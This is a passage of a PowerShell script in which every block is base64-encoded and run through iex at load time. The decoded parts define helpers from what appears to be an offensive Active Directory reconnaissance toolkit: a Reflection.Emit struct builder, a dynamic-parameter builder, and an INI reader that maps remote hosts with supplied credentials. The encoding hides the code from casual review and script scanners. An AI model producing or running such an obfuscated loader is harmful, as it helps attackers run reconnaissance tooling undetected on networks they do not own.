KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OlVuYm94X0FueSwgJFN0cnVjdEJ1aWxkZXIpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6UmV0KQogICAgJFN0cnVjdEJ1aWxkZXIuQ3JlYXRlVHlwZSgpCn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RnVuY3Rpb24gTmV3LUR5bmFtaWNQYXJhbWV0ZXIgewogICAgW0NtZGxldEJpbmRpbmcoRGVmYXVsdFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgUGFyYW0gKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJHRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbc3RyaW5nXSROYW1lLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbU3lzdGVtLlR5cGVdJFR5cGUgPSBbaW50XSwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N0cmluZ1tdXSRBbGlhcywKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N3aXRjaF0kTWFuZGF0b3J5LAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbaW50XSRQb3NpdGlvbiwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N0cmluZ10kSGVscE1lc3NhZ2UsCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtzd2l0Y2hdJERvbnRTaG93LAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3dpdGNoXSRWYWx1ZUZyb21QaXBlbGluZSwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N3aXRjaF0kVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N3aXRjaF0kVmFsdWVGcm9tUmVtYWluaW5nQXJndW1lbnRzLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbc3RyaW5nXSRQYXJhbWV0ZXJTZXROYW1lID0gJ19fQWxsUGFyYW1ldGVyU2V0cycsCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtzd2l0Y2hdJEFsbG93TnVsbCwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N3aXRjaF0kQWxsb3dFbXB0eVN0cmluZywKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N3aXRjaF0kQWxsb3dFbXB0eUNvbGxlY3Rpb24sCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtzd2l0Y2hdJFZhbGlkYXRlTm90TnVsbCwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW3N3aXRjaF0kVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW1ZhbGlkYXRlQ291bnQoMiwyKV0KICAgICAgICBbaW50W11dJFZhbGlkYXRlQ291bnQsCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtWYWxpZGF0ZUNvdW50KDIsMildCiAgICAgICAgW2ludFtdXSRWYWxpZGF0ZVJhbmdlLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbVmFsaWRhdGVDb3VudCgyLDIpXQogICAgICAgIFtpbnRbXV0kVmFsaWRhdGVMZW5ndGgsCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW3N0cmluZ10kVmFsaWRhdGVQYXR0ZXJuLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0R5bmFtaWNQYXJhbWV0ZXInKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtzY3JpcHRibG9ja10kVmFsaWRhdGVTY3JpcHQsCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJHRydWUsIFBhcmFtZXRlclNldE5hbWUgPSAnRHluYW1pY1BhcmFtZXRlcicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW3N0cmluZ1tdXSRWYWxpZGF0ZVNldCwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdEeW5hbWljUGFyYW1ldGVyJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoewogICAgICAgICAgICBpZighKCRfIC1pcyBbU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW50aW1lRGVmaW5lZFBhcmFtZXRlckRpY3Rpb25hcnldKSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgJ0RpY3Rpb25hcnkgbXVzdCBiZSBhIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVudGltZURlZmluZWRQYXJhbWV0ZXJEaWN0aW9uYXJ5IG9iamVjdCcKICAgICAgICAgICAgfQogICAgICAgICAgICAkdHJ1ZQogICAgICAgIH0pXQogICAgICAgICREaWN0aW9uYXJ5ID0gJGZhbHNlLAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkdHJ1ZSwgUGFyYW1ldGVyU2V0TmFtZSA9ICdDcmVhdGVWYXJpYWJsZXMnKV0KICAgICAgICBbc3dpdGNoXSRDcmVhdGVWYXJpYWJsZXMsCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lID0gJ0NyZWF0ZVZhcmlhYmxlcycpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHsKICAgICAgICAgICAgaWYoJF8uR2V0VHlwZSgpLk5hbWUgLW5vdG1hdGNoICdEaWN0aW9uYXJ5JykgewogICAgICAgICAgICAgICAgVGhyb3cgJ0JvdW5kUGFyYW1ldGVycyBtdXN0IGJlIGEgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0JvdW5kUGFyYW1ldGVyc0RpY3Rpb25hcnkgb2JqZWN0JwogICAgICAgICAgICB9CiAgICAgICAgICAgICR0cnVlCiAgICAgICAgfSldCiAgICAgICAgJEJvdW5kUGFyYW1ldGVycwogICAgKQogICAgQmVnaW4gewogICAgICAgICRJbnRlcm5hbERpY3Rpb25hcnkgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnRpbWVEZWZpbmVkUGFyYW1ldGVyRGljdGlvbmFyeQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ICAgICAgICBmdW5jdGlvbiBfdGVtcCB7IFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKCkgfQogICAgICAgICRDb21tb25QYXJhbWV0ZXJzID0gKEdldC1Db21tYW5kIF90ZW1wKS5QYXJhbWV0ZXJzLktleXMKICAgIH0KICAgIFByb2Nlc3MgewogICAgICAgIGlmKCRDcmVhdGVWYXJpYWJsZXMpIHsKICAgICAgICAgICAgJEJvdW5kS2V5cyA9ICRCb3VuZFBhcmFtZXRlcnMuS2V5cyB8IFdoZXJlLU9iamVjdCB7ICRDb21tb25QYXJhbWV0ZXJzIC1ub3Rjb250YWlucyAkXyB9CiAgICAgICAgICAgIEZvckVhY2goJFBhcmFtZXRlciBpbiAkQm91bmRLZXlzKSB7CiAgICAgICAgICAgICAgICBpZiAoJFBhcmFtZXRlcikgewogICAgICAgICAgICAgICAgICAgIFNldC1WYXJpYWJsZSAtTmFtZSAkUGFyYW1ldGVyIC1WYWx1ZSAkQm91bmRQYXJhbWV0ZXJzLiRQYXJhbWV0ZXIgLVNjb3BlIDEgLUZvcmNlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICRTdGFsZUtleXMgPSBAKCkKICAgICAgICAgICAgJFN0YWxlS2V5cyA9ICRQU0JvdW5kUGFyYW1ldGVycy5HZXRFbnVtZXJhdG9yKCkgfAogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkXy5WYWx1ZS5QU29iamVjdC5NZXRob2RzLk5hbWUgLW1hdGNoICdeRXF1YWxzJCcpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZighJF8uVmFsdWUuRXF1YWxzKChHZXQtVmFyaWFibGUgLU5hbWUgJF8uS2V5IC1WYWx1ZU9ubHkgLVNjb3BlIDApKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkXy5LZXkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkXy5WYWx1ZSAtbmUgKEdldC1WYXJpYWJsZSAtTmFtZSAkXy5LZXkgLVZhbHVlT25seSAtU2NvcGUgMCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8uS2V5CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRTdGFsZUtleXMpIHsKICAgICAgICAgICAgICAgICRTdGFsZUtleXMgfCBGb3JFYWNoLU9iamVjdCB7W3ZvaWRdJFBTQm91bmRQYXJhbWV0ZXJzLlJlbW92ZSgkXyl9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJFVuYm91bmRQYXJhbWV0ZXJzID0gKEdldC1Db21tYW5kIC1OYW1lICgkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkludm9jYXRpb25OYW1lKSkuUGFyYW1ldGVycy5HZXRFbnVtZXJhdG9yKCkgIHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLlZhbHVlLlBhcmFtZXRlclNldHMuS2V5cyAtY29udGFpbnMgJFBzQ21kbGV0LlBhcmFtZXRlclNldE5hbWUgfSB8CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgS2V5IHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJFBTQm91bmRQYXJhbWV0ZXJzLktleXMgLW5vdGNvbnRhaW5zICRfIH0KICAgICAgICAgICAgJHRtcCA9ICRudWxsCiAgICAgICAgICAgIEZvckVhY2ggKCRQYXJhbWV0ZXIgaW4gJFVuYm91bmRQYXJhbWV0ZXJzKSB7CiAgICAgICAgICAgICAgICAkRGVmYXVsdFZhbHVlID0gR2V0LVZhcmlhYmxlIC1OYW1lICRQYXJhbWV0ZXIgLVZhbHVlT25seSAtU2NvcGUgMAogICAgICAgICAgICAgICAgaWYoISRQU0JvdW5kUGFyYW1ldGVycy5UcnlHZXRWYWx1ZSgkUGFyYW1ldGVyLCBbcmVmXSR0bXApIC1hbmQgJERlZmF1bHRWYWx1ZSkgewogICAgICAgICAgICAgICAgICAgICRQU0JvdW5kUGFyYW1ldGVycy4kUGFyYW1ldGVyID0gJERlZmF1bHRWYWx1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCREaWN0aW9uYXJ5KSB7CiAgICAgICAgICAgICAgICAkRFBEaWN0aW9uYXJ5ID0gJERpY3Rpb25hcnkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICREUERpY3Rpb25hcnkgPSAkSW50ZXJuYWxEaWN0aW9uYXJ5CiAgICAgICAgICAgIH0KICAgICAgICAgICAgJEdldFZhciA9IHtHZXQtVmFyaWFibGUgLU5hbWUgJF8gLVZhbHVlT25seSAtU2NvcGUgMH0KICAgICAgICAgICAgJEF0dHJpYnV0ZVJlZ2V4ID0gJ14oTWFuZGF0b3J5fFBvc2l0aW9ufFBhcmFtZXRlclNldE5hbWV8RG9udFNob3d8SGVscE1lc3NhZ2V8VmFsdWVGcm9tUGlwZWxpbmV8VmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZXxWYWx1ZUZyb21SZW1haW5pbmdBcmd1bWVudHMpJCcKICAgICAgICAgICAgJFZhbGlkYXRpb25SZWdleCA9ICdeKEFsbG93TnVsbHxBbGxvd0VtcHR5U3RyaW5nfEFsbG93RW1wdHlDb2xsZWN0aW9ufFZhbGlkYXRlQ291bnR8VmFsaWRhdGVMZW5ndGh8VmFsaWRhdGVQYXR0ZXJufFZhbGlkYXRlUmFuZ2V8VmFsaWRhdGVTY3JpcHR8VmFsaWRhdGVTZXR8VmFsaWRhdGVOb3ROdWxsfFZhbGlkYXRlTm90TnVsbE9yRW1wdHkpJCcKICAgICAgICAgICAgJEFsaWFzUmVnZXggPSAnXkFsaWFzJCcKICAgICAgICAgICAgJFBhcmFtZXRlckF0dHJpYnV0ZSA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUGFyYW1ldGVyQXR0cmlidXRlCiAgICAgICAgICAgIHN3aXRjaCAtcmVnZXggKCRQU0JvdW5kUGFyYW1ldGVycy5LZXlzKSB7CiAgICAgICAgICAgICAgICAkQXR0cmlidXRlUmVnZXggewogICAgICAgICAgICAgICAgICAgIFRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRQYXJhbWV0ZXJBdHRyaWJ1dGUuJF8gPSAuICRHZXRWYXIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgQ2F0Y2ggewogICAgICAgICAgICAgICAgICAgICAgICAkXwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCREUERpY3Rpb25hcnkuS2V5cyAtY29udGFpbnMgJE5hbWUpIHsKICAgICAgICAgICAgICAgICREUERpY3Rpb25hcnkuJE5hbWUuQXR0cmlidXRlcy5BZGQoJFBhcmFtZXRlckF0dHJpYnV0ZSkKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRBdHRyaWJ1dGVDb2xsZWN0aW9uID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgQ29sbGVjdGlvbnMuT2JqZWN0TW9kZWwuQ29sbGVjdGlvbltTeXN0ZW0uQXR0cmlidXRlXQogICAgICAgICAgICAgICAgc3dpdGNoIC1yZWdleCAoJFBTQm91bmRQYXJhbWV0ZXJzLktleXMpIHsKICAgICAgICAgICAgICAgICAgICAkVmFsaWRhdGlvblJlZ2V4IHsKICAgICAgICAgICAgICAgICAgICAgICAgVHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRQYXJhbWV0ZXJPcHRpb25zID0gTmV3LU9iamVjdCAtVHlwZU5hbWUgIlN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uJHtffUF0dHJpYnV0ZSIgLUFyZ3VtZW50TGlzdCAoLiAkR2V0VmFyKSAtRXJyb3JBY3Rpb24gU3RvcAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEF0dHJpYnV0ZUNvbGxlY3Rpb24uQWRkKCRQYXJhbWV0ZXJPcHRpb25zKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIENhdGNoIHsgJF8gfQogICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkQWxpYXNSZWdleCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUGFyYW1ldGVyQWxpYXMgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFsaWFzQXR0cmlidXRlIC1Bcmd1bWVudExpc3QgKC4gJEdldFZhcikgLUVycm9yQWN0aW9uIFN0b3AKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRBdHRyaWJ1dGVDb2xsZWN0aW9uLkFkZCgkUGFyYW1ldGVyQWxpYXMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIENhdGNoIHsgJF8gfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRBdHRyaWJ1dGVDb2xsZWN0aW9uLkFkZCgkUGFyYW1ldGVyQXR0cmlidXRlKQogICAgICAgICAgICAgICAgJFBhcmFtZXRlciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVudGltZURlZmluZWRQYXJhbWV0ZXIgLUFyZ3VtZW50TGlzdCBAKCROYW1lLCAkVHlwZSwgJEF0dHJpYnV0ZUNvbGxlY3Rpb24pCiAgICAgICAgICAgICAgICAkRFBEaWN0aW9uYXJ5LkFkZCgkTmFtZSwgJFBhcmFtZXRlcikKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIEVuZCB7CiAgICAgICAgaWYoISRDcmVhdGVWYXJpYWJsZXMgLWFuZCAhJERpY3Rpb25hcnkpIHsKICAgICAgICAgICAgJERQRGljdGlvbmFyeQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LUluaUNvbnRlbnQgewogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKFtIYXNodGFibGVdKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdGdWxsTmFtZScsICdOYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFBhdGgsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5LAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJE91dHB1dE9iamVjdAogICAgKQogICAgQkVHSU4gewogICAgICAgICRNYXBwZWRDb21wdXRlcnMgPSBAe30KICAgIH0KICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRUYXJnZXRQYXRoIGluICRQYXRoKSB7CiAgICAgICAgICAgIGlmICgoJFRhcmdldFBhdGggLU1hdGNoICdcXFxcLipcXC4qJykgLWFuZCAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pKSB7CiAgICAgICAgICAgICAgICAkSG9zdENvbXB1dGVyID0gKE5ldy1PYmplY3QgU3lzdGVtLlVyaSgkVGFyZ2V0UGF0aCkpLkhvc3QKICAgICAgICAgICAgICAgIGlmICgtbm90ICRNYXBwZWRDb21wdXRlcnNbJEhvc3RDb21wdXRlcl0pIHsKICAgICAgICAgICAgICAgICAgICBBZGQtUmVtb3RlQ29ubmVjdGlvbiAtQ29tcHV0ZXJOYW1lICRIb3N0Q29tcHV0ZXIgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICAgICAkTWFwcGVkQ29tcHV0ZXJzWyRIb3N0Q29tcHV0ZXJdID0gJFRydWUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRUYXJnZXRQYXRoKSB7CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydPdXRwdXRPYmplY3QnXSkgewogICAgICAgICAgICAgICAgICAgICRJbmlPYmplY3QgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAkSW5pT2JqZWN0ID0gQHt9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBTd2l0Y2ggLVJlZ2V4IC1GaWxlICRUYXJnZXRQYXRoIHsKICAgICAgICAgICAgICAgICAgICAiXlxbKC4rKVxdIiAjIFNlY3Rpb24KICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWN0aW9uID0gJG1hdGNoZXNbMV0uVHJpbSgpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ091dHB1dE9iamVjdCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU2VjdGlvbiA9ICRTZWN0aW9uLlJlcGxhY2UoJyAnLCAnJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTZWN0aW9uT2JqZWN0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEluaU9iamVjdCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICRTZWN0aW9uICRTZWN0aW9uT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSW5pT2JqZWN0WyRTZWN0aW9uXSA9IEB7fQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICRDb21tZW50Q291bnQgPSAwCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJeKDsuKikkIiAjIENvbW1lbnQKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRWYWx1ZSA9ICRtYXRjaGVzWzFdLlRyaW0oKQogICAgICAgICAgICAgICAgICAgICAgICAkQ29tbWVudENvdW50ID0gJENvbW1lbnRDb3VudCArIDEKICAgICAgICAgICAgICAgICAgICAgICAgJE5hbWUgPSAnQ29tbWVudCcgKyAkQ29tbWVudENvdW50CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ091dHB1dE9iamVjdCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmFtZSA9ICROYW1lLlJlcGxhY2UoJyAnLCAnJykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbmlPYmplY3QuJFNlY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAkTmFtZSAkVmFsdWUKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJbmlPYmplY3RbJFNlY3Rpb25dWyROYW1lXSA9ICRWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICIoLis/KVxzKj0oLiopIiAjIEtleQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE5hbWUsICRWYWx1ZSA9ICRtYXRjaGVzWzEuLjJdCiAgICAgICAgICAgICAgICAgICAgICAgICROYW1lID0gJE5hbWUuVHJpbSgpCiAgICAgICAgICAgICAgICAgICAgICAgICRWYWx1